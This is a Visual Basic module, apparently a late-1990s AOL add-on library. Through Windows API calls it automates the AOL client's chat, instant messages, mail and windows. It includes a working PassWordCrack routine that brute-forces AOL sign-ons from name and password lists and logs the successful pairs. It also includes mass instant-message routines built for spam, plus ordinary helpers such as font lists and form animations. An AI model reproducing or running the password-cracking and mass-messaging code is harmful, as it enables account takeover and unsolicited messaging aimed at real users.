Dim HoldThem As Long, Howmnybts As Long, chil As Long, Rich As Long
Dim Lis As Long, GetIt As Long, Edi As Long, MakeSure As Integer
Dim aol As Long, mdi As Long, AolThread, AolProcessThread
Dim chk As Long, Tit As Long, i As Integer
''''
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindChat
Rich& = FindWindowEx(chil&, 0&, "RICHCNTL", vbNullString)
Lis& = FindWindowEx(chil&, 0&, "_AOL_Listbox", vbNullString)


AolThread = GetWindowThreadProcessId(Lis&, AProc)
AolProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AProc)

If AolProcessThread Then
For i = 0 To SendMessage(Lis&, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
holdit = SendMessage(Lis&, LB_GETITEMDATA, ByVal CLng(i), ByVal 0&)
holdit = holdit + 24
Call ReadProcessMemory(AolProcessThread, holdit, Person$, 4, Howmnybts)
                        
Call RtlMoveMemory(HoldThem, ByVal Person$, 4)
HoldThem = HoldThem + 6

Person$ = String$(20, vbNullChar)
Call ReadProcessMemory(AolProcessThread, HoldThem, Person$, Len(Person$), Howmnybts)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If InStr(LCase(Person$), LCase(InsName)) <> 0 And InStr(LCase(GetUserSn), LCase(InsName)) = 0 Then
Call SendMessage(Lis&, LB_SETCURSEL, i, 0&)
Call SendMessage(Lis&, WM_LBUTTONDBLCLK, 0, 0&)
        Do: DoEvents
            Tit& = FindChildByTitle(mdi&, chil&, Person$)
                chk& = FindWindowEx(Tit&, 0&, "_AOL_Checkbox", vbNullString)
            If Tit& <> 0 And chk& <> 0 Then Exit Do
        Loop

            Do: DoEvents
                Call ClickButton(chk&)
                        GetIt& = SendMessage(chk&, BM_GETCHECK, 0&, 0&)
                        If GetIt& = 0 Then Exit Do
                        Loop
                        Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
                    Exit For
            End If


Next i
Call CloseHandle(AolProcessThread)
Wait (0.3)
If InStr(LCase(Person$), LCase(InsName)) <> 0 Then
    UnIgnoreStat = True
    InsName = Person$
ElseIf LCase(Person$) = LCase(InsName) Then
    UnIgnoreStat = False
Else
    UnIgnoreStat = False
End If
  Edi& = FindChatEdit
  MakeSure = SendMessageByNum(Edi&, 13, 0, 0&)
End If

End Sub


Public Sub ImAutoRespond(message As String)
'put in timer
On Error Resume Next
Dim aol As Long, mdi As Long, Tit As Long, Tit2 As Long, titf As Long, Tname$, chil As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, ">Instant Message From:")
Tit2& = FindChildByTitle(mdi&, chil&, "Instant Message From:")
If Tit& <> 0 Then
    titf& = Tit&
ElseIf Tit2& <> 0 Then
    titf& = Tit2&
End If
    If titf& <> 0 Then
        Tname$ = SNfromIM
        Call SendMessage(titf&, WM_CLOSE, 0, 0&)
        Call InstantMessage(Tname$, message)
    End If
End Sub

Public Sub IMUnIgnore(Who As String)

Call InstantMessage("$im_on " & Who, Plug)

End Sub
Public Sub IMIgnore(Who As String)

Call InstantMessage("$im_off " & Who, Plug)

End Sub

Public Sub MassIM(Lis As ListBox, message As String)
On Error Resume Next
Dim aol As Long, mdi As Long, chil As Long, Tit As Long, Rich As Long, _
icona As Long, X As Integer

aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Send Instant Message")
Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
For X = 0 To Lis.ListCount - 1
Call InstantMessage(Lis.List(X), message)
Wait (0.5)
If Tit& <> 0 Then
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
End If
Wait (0.5)
Call ToImKill
Next X

End Sub
Public Sub MassIm2(Lis As ListBox, message As String)
On Error Resume Next
'this version adds the "What up" and there
'screen name
Dim aol As Long, mdi As Long, chil As Long, Rich As Long, icona As Long, _
X As Integer, Tit As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Send Instant Message")
Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
For X = 0 To Lis.ListCount - 1
Call InstantMessage(Lis.List(X), "What up " & Lis.List(X) & " " & message)
Wait (0.5)
If Tit& <> 0 Then
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
End If
Wait (0.5)
Call ToImKill
Next X

End Sub
Public Sub MassIm3(Lis As ListBox, message As String)
On Error Resume Next
'this version adds the "What up" and there
'screen name but takes #'s off the screen name
'so instead of "What up John4516" itll say
'"What up John" ,told ya that would come in handy
Dim aol As Long, mdi As Long, chil As Long, Rich As Long, icona As Long, _
X As Integer, Tit As Long, Trimmed As String
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Send Instant Message")
Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
For X = 0 To Lis.ListCount - 1
Trimmed$ = TrimNumbers(Lis.List(X))
Call InstantMessage(Lis.List(X), "What up " & Trimmed$ & " " & message)
Wait (0.5)
If Tit& <> 0 Then
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
End If
Wait (0.5)
Call ToImKill
Wait (0.5)
Next X

End Sub
Public Sub MassIm4(Lis As ListBox, message As String)
On Error Resume Next
'same as 3 except adds % done on bottom
Dim aol As Long, mdi As Long, chil As Long, Rich As Long, icona As Long, _
X As Integer, Tit As Long, Trimmed As String, i As Double
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Send Instant Message")
Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)

Dim perc As Integer
For X = 0 To Lis.ListCount - 1
Trimmed$ = TrimNumbers(Lis.List(X))
i = 100 / Lis.ListCount
perc = Int(i * X)
Call InstantMessage(Lis.List(X), "What up, " & Trimmed$ & " " & message & Chr(13) & Chr(9) & "      " & perc & "% Complete")
Wait (0.5)
If Tit& <> 0 Then
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
End If
Wait (0.5)
Call ToImKill
Next X

End Sub





Public Sub PassWordCrack(NameList As ListBox, PWList As ListBox, Cracked As ListBox, Optional DelayTime As Variant)
'This is the last time you'll see this sub
'too many revisions over a long period of time made this
'sub a mess, but it works good ;o)
'Use OPTIONAL delaytime parameter to make a delay
'between cracks for tcp/ip cracking
'10 , or 15 seconds is good enough not to lagg the computer
Dim aol As Long, mdi As Long, Tit1 As Long, Tit2 As Long
Dim ChkEven, chil As Long, Tit As Long
Dim Times As Integer, PASS As Integer, name As Integer
Dim Buttns As Integer, Combo As Long, Edi As Long, _
icona As Long, i As Integer, Modal As Long, Stat As Long, _
IconB As Long, Edi2 As Long, Edi3 As Long, MainName As String, _
CurrPassword As String, CurrPassword2 As String, an As Long, Ced As Boolean
Dim DamnAd As Long, but As Long
Ced = False

If OnlineOrNot = True Then
    MsgBox ("Must be OffLine for this feature."), vbInformation, ("Error")
        Exit Sub
    End If
   ChkEven = (PWList.ListCount / 2) 'check to see if its even
If InStr(ChkEven, ".") <> 0 Then 'look for . in .5
PWList.AddItem "default" 'add item to make list even
End If

For name = 0 To NameList.ListCount - 1 'Take next name in list
For PASS = 0 To PWList.ListCount - 1 Step 2 'Take next Password from list
    
Do: DoEvents 'start wait for sign on/goodbye screen
     If OnlineOrNot = True Then
        Wait (0.5)
        PASS = PASS - 1
        Exit For
    End If
    If DamnAd& <> 0 And but& <> 0 Then
        Call ClickButton(but&)
        Wait (1)
    End If
    
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit1& = FindChildByTitle(mdi&, chil&, "Sign On")
Tit2& = FindChildByTitle(mdi&, chil&, "Goodbye from America Online!")
    Tit& = IIf(Tit1& <> 0, Tit1&, Tit2&)
DoEvents
Combo& = FindWindowEx(Tit&, 0&, "_AOL_Combobox", vbNullString)
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
    DamnAd& = FindWindow("_AOL_Modal", vbNullString) 'look for ad that might come on signon
    but& = FindWindowEx(DamnAd&, 0&, "_AOL_Button", vbNullString)
Call ClickButton(but&)
If Combo& <> 0 And icona& <> 0 Then Exit Do
Loop
'''''''''''''''''''''''''''''''''''''''''''''''''
Call SendMessage(Combo&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(Combo&, WM_LBUTTONUP, 0, 0&)
Call SendMessage(Combo&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(Combo&, WM_LBUTTONUP, 0, 0&)
    If Edi& <> 0 Then
For i = 1 To 9
Call SendMessageByNum(Combo&, WM_KEYDOWN, VK_RIGHT, 0)
Call SendMessageByNum(Combo&, WM_KEYUP, VK_RIGHT, 0)
Wait (0.2)
Next i
    End If
    DoEvents
   icona& = GetWindow(icona&, GW_HWNDNEXT)
        icona& = GetWindow(icona&, GW_HWNDNEXT)
            icona& = GetWindow(icona&, GW_HWNDNEXT)
            Call ClickButton(icona&)
'''''''''''''''''''''''''''''''''''''''''''''''''
Call WaitForModal
Wait (0.2)
Modal& = FindWindow("_AOL_Modal", vbNullString)
Stat& = FindWindowEx(Modal&, 0&, "_AOL_Static", vbNullString)
IconB& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
Edi& = FindWindowEx(Modal&, 0&, "_AOL_Edit", vbNullString)
    Edi2& = GetWindow(Edi&, GW_HWNDNEXT)
        Edi3& = GetWindow(Edi2&, GW_HWNDNEXT)
''''''''''''''''''''''''''''''''''''''''''''''''''
MainName$ = NameList.List(name)
NameList.Selected(name) = True
CurrPassword$ = PWList.List(PASS)
PWList.Selected(PASS) = True
Call SendMessageByString(Edi&, WM_SETTEXT, 0, MainName$) 'Write current name
Call SendMessageByString(Edi3&, WM_SETTEXT, 0, CurrPassword$) 'Write next password

''''''''''''''''''''''''''''''''''''''''''''''''''
Call SendMessage(IconB&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(IconB&, WM_LBUTTONUP, 0, 0&)
Do: DoEvents
an& = FindWindow("#32770", vbNullString)
Wait (0.5)
     If OnlineOrNot = True Then
            Wait (0.5)
            Exit For
     End If
Loop Until an& <> 0

Call SendMessage(an&, WM_CLOSE, 0, 0&)
CurrPassword2$ = PWList.List(Val(PASS) + 1)
PWList.Selected(Val(PASS) + 1) = True
Wait (0.5)

Call SendMessageByString(Edi&, WM_SETTEXT, 0, MainName$) 'Write current name
Call SendMessageByString(Edi3&, WM_SETTEXT, 0, CurrPassword2$) 'Write next password
Call SendMessage(IconB&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(IconB&, WM_LBUTTONUP, 0, 0&)
Wait (0.5)
    If an& <> 0 Then
        Call SendMessage(an&, WM_CLOSE, 0, 0&)
    End If

Wait (0.5)
    If IsMissing(DelayTime) = False Then
        Wait (DelayTime)
    End If

Next PASS 'Take next password, hold same name
Wait (2)
DamnAd& = FindWindow("_AOL_Modal", vbNullString)
but& = FindWindowEx(DamnAd&, 0&, "_AOL_Button", vbNullString)
If DamnAd& <> 0 And but& <> 0 Then
    Call ClickButton(but&)
    Wait (2)
End If
If OnlineOrNot = True Then
        Cracked.AddItem "sn=" & NameList.List(name) & " pw=" & PWList.List(PASS)
        Call SignOff
                Do: DoEvents
                If OnlineOrNot = False Then Exit Do
                Loop
End If
Next name 'Password list done, take next name

End Sub


Public Sub ClearKeyWord()

Dim aol As Long, tool As Long, ToolB As Long, Comb As Long, _
Edi As Long
aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
Comb& = FindWindowEx(ToolB&, 0&, "_AOL_Combobox", vbNullString)
Edi& = FindWindowEx(Comb&, 0&, "Edit", vbNullString)

  Call SendMessageByString(Edi&, WM_SETTEXT, 0, "")
End Sub

Public Function InRoom() As Boolean

Dim chil As Long
Dim inRoomTF As Boolean
chil& = FindChat
If chil& <> 0 Then
inRoomTF = True
Else
inRoomTF = False
End If
InRoom = inRoomTF
End Function


Public Sub ChatFontSend(WatFont As String, txt As String)
'the font is Case Sensative so try using
'the idea i gave in the sub to add
'Fonts to a filelistbox
Call ChatSend("<Font Face=" & Chr(34) & WatFont & Chr(34) & ">" & txt)
'to use this in a normal way use
'Call ChatFontSend("Wingdings", "blah blah blah")
' or Call ChatFontSend(text1.text, "blah blah blah")
End Sub

Public Function GetRoomTitle()
Dim RoomTit As Long, Lent As Long, titl As Long, final$, Strn$
RoomTit& = FindChat

Lent& = GetWindowTextLength(RoomTit&)
Strn$ = String$(200, 0)
titl& = GetWindowText(RoomTit&, Strn$, (Lent& + 1))
final$ = CStr(Strn$)
GetRoomTitle = final$

End Function

Public Function IM_GetText() As String
'gets text from ims
Dim aol As Long, mdi As Long, chil As Long, Tit As Long, _
Tit2 As Long, tit3 As Long, Rich As Long, SPBuffa As String, _
sendnum As Long, final As String

aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, ">Instant Message From:")
Tit2& = FindChildByTitle(mdi&, chil&, "Instant Message From:")
tit3& = FindChildByTitle(mdi&, chil&, "Instant Message To:")
If Tit& <> 0 Then
    Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
    sendnum = SendMessageByNum(Rich&, 14, 0&, 0&)
    SPBuffa$ = Space$(sendnum)
    Call SendMessageByString(Rich&, 13, sendnum + 1, SPBuffa$)
    final$ = CStr(SPBuffa$)
    IM_GetText = final$
ElseIf Tit2& <> 0 Then
    Rich& = FindWindowEx(Tit2&, 0&, "RICHCNTL", vbNullString)
    sendnum = SendMessageByNum(Rich&, 14, 0&, 0&)
    SPBuffa$ = Space$(sendnum)
    Call SendMessageByString(Rich&, 13, sendnum + 1, SPBuffa$)
    final$ = CStr(SPBuffa$)
    IM_GetText = final$
ElseIf tit3& <> 0 Then
    Rich& = FindWindowEx(tit3&, 0&, "RICHCNTL", vbNullString)
    sendnum = SendMessageByNum(Rich&, 14, 0&, 0&)
    SPBuffa$ = Space$(sendnum)
    Call SendMessageByString(Rich&, 13, sendnum + 1, SPBuffa$)
    final$ = CStr(SPBuffa$)
    IM_GetText = final$
End If

End Function

Public Function GetUserSn()

Dim aol As Long, mdi As Long, chil As Long, weltit As Long, strin$, titl As Long, _
Sname$, Lent&
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
weltit& = FindChildByTitle(mdi&, chil&, "Welcome,")

Lent& = GetWindowTextLength(weltit&)
strin$ = String$(200, 0)
titl& = GetWindowText(weltit&, strin$, (Lent& + 1))

Sname$ = Mid$(strin$, 10, (InStr(strin$, "!") - 10))
If Sname$ = "" Then Sname$ = "N/A"

GetUserSn = Sname$
End Function


Public Sub InstantMessage(Who As String, Wat As String)
If Aol_Version = "4" Then
Call RunAOLMenu(10, 7)
Else
Call RunAOLMenu(10, 9)
End If

Dim aol As Long, mdi As Long, Tit As Long, Rich As Long, _
icona As Long, Edi As Long, annoying As Long, chil As Long, i As Integer
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Send Instant Message")
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)
Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
If Tit& <> 0 And Edi& <> 0 And Rich& <> 0 And icona& <> 0 Then Exit Do
Loop
Call SendMessageByString(Edi&, WM_SETTEXT, 0, Who)
DoEvents
Call SendMessageByString(Rich&, WM_SETTEXT, 0, Wat)
For i = 1 To 9
icona& = GetWindow(icona&, GW_HWNDNEXT)
Next i
Call ClickButton(icona&)
Call ClearKeyWord

Dim ck As Integer
For ck = 1 To 2
      annoying& = FindWindow("#32770", vbNullString)
          If annoying& <> 0 Then
               Call SendMessage(annoying&, WM_CLOSE, 0, 0&)
              Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
                Exit For
          End If
          Wait (0.5)
Next ck

End Sub
Public Function OnlineOrNot() As Boolean
'for 4.0
Dim aol As Long, mdi As Long, chil As Long, mdi2 As Long, Tit As Long, Tit2 As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "welcome,")
OnlineOrNot = IIf(Tit& <> 0, True, False)

End Function

Public Sub Keyword(Word As String)
Dim aol As Long, tool As Long, ToolB As Long, Comb As Long
Dim Butn As Long, KWWin As Long, Kedi As Long, mdi As Long, _
chil As Long, iconK As Long, cntr As Integer

aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
Comb& = FindWindowEx(ToolB&, 0&, "_AOL_Combobox", vbNullString)

        Butn& = GetWindow(Comb&, GW_HWNDNEXT)
        
If Aol_Version = "5" Then

        For cntr = 1 To 9
            Butn& = GetWindow(Butn&, GW_HWNDNEXT)
        Next cntr
Else

    Butn& = GetWindow(Butn&, GW_HWNDPREV)
    Butn& = GetWindow(Butn&, GW_HWNDPREV)

End If

                Call ClickButton(Butn&)
        Do: DoEvents
            mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
            chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
            KWWin& = FindChildByTitle(mdi&, chil&, "Keyword")
            Kedi& = FindWindowEx(KWWin&, 0&, "_AOL_Edit", vbNullString)
            iconK& = FindWindowEx(KWWin&, 0&, "_AOL_Icon", vbNullString)
        Loop Until Kedi& <> 0 And iconK& <> 0
        DoEvents
        Call SendMessageByString(Kedi&, WM_SETTEXT, 0, Word)
        Call ClickButton(iconK&)


End Sub

Public Function LastChatLine()
Dim chil As Long, one$, Rich As Long, sendnum, SPBuffa$, last, LastLine$, RichCntl$
Dim i As Integer, X As String
chil& = FindChat
Rich& = FindWindowEx(chil&, 0&, "RICHCNTL", vbNullString)

sendnum = SendMessageByNum(Rich&, 14, 0&, 0&)
SPBuffa$ = Space$(sendnum)
last = SendMessageByString(Rich&, 13, sendnum + 1, SPBuffa$)

RichCntl$ = SPBuffa$
X$ = RichCntl$

For i = 1 To Len(X$)
one$ = Mid(X$, i, 1)
LastLine$ = LastLine$ & one$
If one$ = Chr(13) Then Let LastLine$ = ""
Next i
LastChatLine = LastLine$

End Function

Public Function LastLineSN()
Dim LastLine$, SnText$, X As Integer, i$
LastLine$ = LastChatLine
For X = 1 To Len(LastLine$)
i$ = Mid(LastLine$, X, 1)
    If i$ = ":" Then
        Let i$ = ""
        Exit For
    End If
    SnText$ = SnText$ & i$
        Next X
LastLineSN = SnText$
End Function


Public Function LastLineText()
Dim LastLine$, txt$
Dim i As String
Dim X As Integer
LastLine$ = LastChatLine
For X = 1 To Len(LastLine$)
i$ = Mid(LastLine$, X, 1)
txt$ = txt$ & i$
If i$ = Chr(9) Then
Let i$ = ""
txt$ = ""
End If


Next X
LastLineText = txt$
End Function





Public Sub SendMail(Who, subj, Wat)
Dim modl As Long, aol As Long, tool As Long, _
ToolB As Long, icona As Long, Edi As Long, _
mdi As Long, Tit As Long, Rich As Long, chil As Long, _
n As Integer, Modal As Long, gnum As Integer, w As Integer, _
i As Integer

aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
icona& = FindWindowEx(ToolB&, 0&, "_AOL_Icon", vbNullString)
icona& = GetWindow(icona&, 2)
Call SendMessage(icona&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(icona&, WM_LBUTTONUP, 0, 0&)
Do: DoEvents
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Write Mail")
Edi& = FindWindowEx(Tit&, 0&, "_AOL_Edit", vbNullString)
Rich& = FindWindowEx(Tit&, 0&, "RICHCNTL", vbNullString)
If Tit& <> 0 And Edi& <> 0 And Rich& <> 0 Then Exit Do
Loop
Call SendMessageByString(Edi&, WM_SETTEXT, 0, Who)
    For n = 1 To 4
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Next n
Call SendMessageByString(Edi&, WM_SETTEXT, 0, subj)
Call SendMessageByString(Rich&, WM_SETTEXT, 0, Wat)
   
    gnum = IIf(Aol_Version = "4", 22, 24)
   
    For i = 1 To gnum
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Next i

Call SendMessage(Edi&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(Edi&, WM_LBUTTONUP, 0, 0&)

w = 0
Do: DoEvents
w = w + 1
    modl& = FindWindow("_AOL_Modal", vbNullString)
    icona& = FindWindowEx(modl&, 0&, "_AOL_Icon", vbNullString)
If modl& <> 0 And icona& <> 0 Then
        Call ClickButton(icona&)
End If
Wait (0.5)
If w >= 4 Then Exit Do
Loop


End Sub

Public Function SNfromIM()
Dim aol As Long, mdi As Long, Tit As Long, _
Tit2 As Long, tit3 As Long, FTit As Long
Dim Buffr As String, WTLen As Long, SN As String, chil As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, ">Instant Message From:")
Tit2& = FindChildByTitle(mdi&, chil&, " Instant Message To:")
tit3& = FindChildByTitle(mdi&, chil&, " Instant Message From:")

If Tit& <> 0 Then
        FTit& = Tit&
ElseIf Tit2& <> 0 Then
        FTit& = Tit2&
ElseIf tit3& <> 0 Then
        FTit& = tit3&
End If

WTLen& = GetWindowTextLength(FTit&)
Buffr$ = String$(200, 0)
Call GetWindowText(FTit&, Buffr$, (WTLen& + 1))
SN$ = Mid(Buffr$, InStr(Buffr$, ":") + 1, Len(Buffr$))

SNfromIM = SN$
End Function

Public Sub PrivateRoom(RoomName As String)
Call Keyword("aol://2719:2-2-" & RoomName)
Dim timr As Integer, FullWin As Long
For timr = 1 To 4
FullWin& = FindWindow("#32770", vbNullString)
    If FullWin& <> 0 Then
        Call SendMessage(FullWin&, WM_CLOSE, 0, 0&)
    Exit For
    End If
Wait (0.5)
Next timr

End Sub




Public Sub ChangeChatStatic(Wat As String)
'changes the label under the listbox
'in the 4.0 chat room
Dim chil As Long, LisB As Long, Stat As Long
chil& = FindChat
LisB& = FindWindowEx(chil&, 0&, "_AOL_Listbox", vbNullString)
Stat& = GetWindow(LisB&, GW_HWNDNEXT)
Call SendMessageByString(Stat&, WM_SETTEXT, 0, Wat)
End Sub







Public Sub ChatSend(Wat As String)
Dim Edi As Long, MSure As Integer

Edi& = FindChatEdit

Call SendMessageByString(Edi&, WM_SETTEXT, 0, Wat$)
Call SendMessage(Edi&, WM_CHAR, 13, 0&)

MSure = GetWindowTextLength(Edi&)
If MSure <> 0 Then
Call SendMessage(Edi&, WM_CHAR, 13, 0&)
End If

End Sub
Public Sub CloseChat()
Dim room As Long
room& = FindChat
Call SendMessage(room&, WM_CLOSE, 0, 0&)
End Sub

Public Sub KillGlyph()
'kill the annoying aol animation on the top right
Dim aol As Long, tool As Long, ToolB As Long, gly As Long
aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
gly& = FindWindowEx(ToolB&, 0&, "_AOL_Glyph", vbNullString)
If gly& <> 0 Then
Call SendMessage(gly&, WM_CLOSE, 0, 0&)
End If
End Sub

Public Sub LinkSend(Url As String, LinkName As String)
'make the url just from www and on
'this will add the http:\\ part
Call ChatSend("< a href=" & Chr(34) & "Http:\\" & Url & Chr(34) & ">" & LinkName & "< /a>")


End Sub
Public Sub LinkSend2(Url As String, LinkName As String, Comments As String)
'same as the first link send but lets you add
'comments after the link
Call ChatSend("< a href=" & Chr(34) & "Http:\\" & Url & Chr(34) & ">" & LinkName & "</a>" & " " & Comments)

End Sub



Public Function SNameDecoder(name As String) As String
Dim X As Integer, letta As String, i As String
For X = 1 To Len(name)
letta$ = Mid(name, X, 1)
If letta$ = "l" Then Let letta$ = "L": GoTo Done
If letta$ = "O" Then Let letta$ = "o": GoTo Done
If letta$ = "I" Then Let letta$ = "i": GoTo Done
If letta$ = "V" Then Let letta$ = "v ": GoTo Done

Done:
i$ = i$ & letta$
Next X
SNameDecoder = i$

End Function

Public Sub FileLoadList(FileName As String, Lis As ListBox)
On Error Resume Next
Dim ln$
Open FileName For Input As #1
Do While Not EOF(1)
 Line Input #1, ln$
Lis.AddItem ln$
Loop
Close #1
End Sub

Public Sub FileSaveList(FileName As String, Lis As ListBox)
Dim X As Integer, Free
Free = FreeFile
Open FileName For Output As Free
For X = 0 To Lis.ListCount - 1
Print #1, Lis.List(X)
Next X
Close #1
End Sub



Public Sub Form_OnTop(Frm As Form)
Call SetWindowPos(Frm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Public Sub Form_RollDownSlow(Frm As Form)
Dim X As Integer, i As Integer
X = Frm.Height
For i = 1 To X Step 40: Frm.Show
Frm.Height = i
Wait (0.000001)
Next i
End Sub
Public Sub Form_RollDown(Frm As Form)
Dim X As Integer, i As Integer
X = Frm.Height

For i = 1 To X Step 80: Frm.Show
Frm.Height = i
Wait (0.000001)
Next i
End Sub

Public Sub Form_RollDownFast(Frm As Form)
Dim X As Integer, i As Integer
X = Frm.Height 'logs the initial hieght
For i = 1 To X Step 80: Frm.Show
Frm.Height = i 'goes to that height 80 by 80
Wait (0.0001)
Next i
End Sub

Public Sub AddFontsToList(Lis As ListBox)
Dim X As Integer
For X = 0 To Screen.FontCount - 1
    Lis.AddItem Screen.Fonts(X)
   
Next X
End Sub
Public Sub AddFontsToCombo(Comb As ComboBox)
Dim X As Integer
For X = 0 To Screen.FontCount - 1
    Comb.AddItem Screen.Fonts(X)
   
Next X
Comb.Text = Comb.List(0)

End Sub



Public Sub RunMenuByString(Wat, strin)
Dim SearchWat As Long, cnt As Long, SubCnt As Long, _
MenuItemCnt As Long, gstrinmenu As Long, _
mString As String, ToSearchSub As Long, fstrin As Integer, _
gstrin As Integer, menuitem As Long
SearchWat& = GetMenu(Wat)
cnt = GetMenuItemCount(SearchWat&)

For fstrin = 0 To cnt - 1
ToSearchSub& = GetSubMenu(SearchWat&, fstrin)
MenuItemCnt = GetMenuItemCount(ToSearchSub&)

For gstrin = 0 To MenuItemCnt - 1
SubCnt = GetMenuItemID(ToSearchSub&, gstrin)
mString$ = String$(100, " ")
gstrinmenu& = GetMenuString(ToSearchSub&, SubCnt, mString$, 100, 1)

If InStr(UCase(mString$), UCase(strin)) Then
menuitem& = SubCnt
GoTo Done
End If

Next gstrin

Next fstrin
Done:
Call SendMessage(Wat, WM_COMMAND, menuitem&, 0)
End Sub








Public Sub BackFlash(object)
'this will make the backround of a label
'textbox etc, flash. put this code in a timer
'dont forget to set the interval , a lower interval
'will make a faster flash ex. Call BackFlash(Label1)
object.BackColor = QBColor(Rnd * 15)

End Sub

Public Sub FileDelete(Path)
On Error Resume Next
Kill (Path)
Exit Sub
If Err Then
MsgBox ("File Deletion error"), vbCritical, ("Error")
End If
End Sub

Public Function FileLength(Path) As Integer
'returns the number of characters in a file
Dim FLen As Integer
FLen = FileLen(Path)
FileLength = FLen

End Function

Public Sub ForeFlash(object)
'this will make the Foreground of a label
'textbox etc, flash. put this code in a timer
'dont forget to set the interval , a lower interval
'will make a faster flash ex. Call ForeFlash(Label1)
object.ForeColor = QBColor(Rnd * 15)

End Sub
Public Sub FileCreate(FileName As String)
Dim FreeF
FreeF = FreeFile
Open FileName For Random As FreeF
Close FreeF
End Sub
